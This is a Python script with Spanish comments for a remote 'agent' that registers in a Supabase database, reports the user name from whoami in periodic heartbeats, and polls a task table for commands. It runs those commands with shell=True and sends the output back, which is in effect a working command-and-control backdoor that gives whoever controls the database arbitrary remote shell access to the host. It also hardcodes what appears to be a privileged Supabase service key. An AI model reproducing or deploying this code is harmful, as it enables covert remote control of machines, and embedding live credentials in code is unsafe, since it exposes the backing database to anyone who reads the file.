import time
import os
from datetime import datetime, timezone
from supabase import create_client, Client
import subprocess

# --- CONFIGURACIÓN DE SUPABASE ---
SUPABASE_URL = "https://ypljskemubzgqsswnnzp.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlwbGpza2VtdWJ6Z3Fzc3dubnpwIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MjUwNTc1NywiZXhwIjoyMDk4MDgxNzU3fQ.U5MbSlwa3gt04_AY7yQsHMEJxSyi1mDFjAb-SSQ82QA"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- CONFIGURACIÓN DEL AGENTE ---
# SEGUNDO AGENTE - IDs diferentes
AGENT_ID = "22222222-2222-2222-2222-222222222222"  # UUID diferente al primer agente
AGENT_NAME = "Agente-Python-02"
AGENT_ROLE = "collector"  # Rol diferente: collector (puedes cambiarlo a relay, monitor, etc.)

def check_and_execute_tasks(agent_id):
    try:
        # 1. Buscar tareas pendientes asignadas a este agente
        response = supabase.table('tasks').select('*').eq('agent_id', agent_id).eq('status', 'pending').execute()
        tasks = response.data

        for task in tasks:
            task_id = task['id']
            command = task['command']
            print(f"[*] Nueva tarea recibida: {command}")

            # 2. Marcar la tarea como 'running' (en ejecución)
            supabase.table('tasks').update({'status': 'running'}).eq('id', task_id).execute()

            # 3. Ejecutar el comando en el sistema operativo
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                status = 'completed' if result.returncode == 0 else 'failed'

            except Exception as e:
                output = f"Error interno ejecutando: {str(e)}"
                status = 'failed'

            # 4. Devolver el resultado a Supabase
            supabase.table('tasks').update({
                'status': status,
                'output': output
            }).eq('id', task_id).execute()
            
            supabase.table('agents').update({
                'last_output': output
            }).eq('id', agent_id).execute()

            print(f"[+] Tarea completada. Resultado y 'last_output' actualizados.")

    except Exception as e:
        print(f"[!] Error revisando tareas: {e}")

def registrar_agente():
    """Registra al agente en la base de datos o lo pone online si ya existe."""
    print(f"[*] Registrando agente {AGENT_NAME} ({AGENT_ROLE})...")

    response = supabase.table("agents").select("*").eq("id", AGENT_ID).execute()

    agente_data = {
        "id": AGENT_ID,
        "name": AGENT_NAME,
        "role": AGENT_ROLE,
        "status": "online",
        "last_heartbeat": datetime.now(timezone.utc).isoformat()
    }

    if len(response.data) == 0:
        supabase.table("agents").insert(agente_data).execute()
        print("[+] Agente registrado exitosamente por primera vez.")
    else:
        supabase.table("agents").update(
            {"status": "online", "last_heartbeat": datetime.now(timezone.utc).isoformat()}).eq("id", AGENT_ID).execute()
        print("[+] Agente reconectado. Estado cambiado a 'online'.")


def enviar_heartbeat():
    """Actualiza la marca de tiempo en Supabase para decir 'estoy vivo'."""
    now_iso = datetime.now(timezone.utc).isoformat()
    
    # Ejecuta whoami y guarda el resultado
    try:
        result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
        output = result.stdout.strip() if result.stdout else result.stderr.strip()
    except Exception as e:
        output = f"Error: {str(e)}"

    try:
        supabase.table("agents").update({"last_heartbeat": now_iso}).eq("id", AGENT_ID).execute()
        supabase.table("agents").update({"last_output": output}).eq("id", AGENT_ID).execute()
        print(f"[~] Heartbeat enviado a las {datetime.now().strftime('%H:%M:%S')} | User: {output}")
    except Exception as e:
        print(f"[-] Error enviando heartbeat: {e}")


def desconectar_agente():
    """Cambia el estado a offline al cerrar el script."""
    print("\n[-] Saliendo... Cambiando estado a offline.")
    try:
        supabase.table("agents").update({"status": "offline"}).eq("id", AGENT_ID).execute()
        print("[+] Estado actualizado a 'offline' con gracia.")
    except Exception as e:
        print(f"[-] No se pudo actualizar el estado al salir: {e}")


if __name__ == "__main__":
    try:
        registrar_agente()

        print("[*] Iniciando bucle de Heartbeat y revisión de tareas (Ctrl+C para salir)...")
        while True:
            enviar_heartbeat()
            check_and_execute_tasks(AGENT_ID)
            time.sleep(5)

    except KeyboardInterrupt:
        desconectar_agente()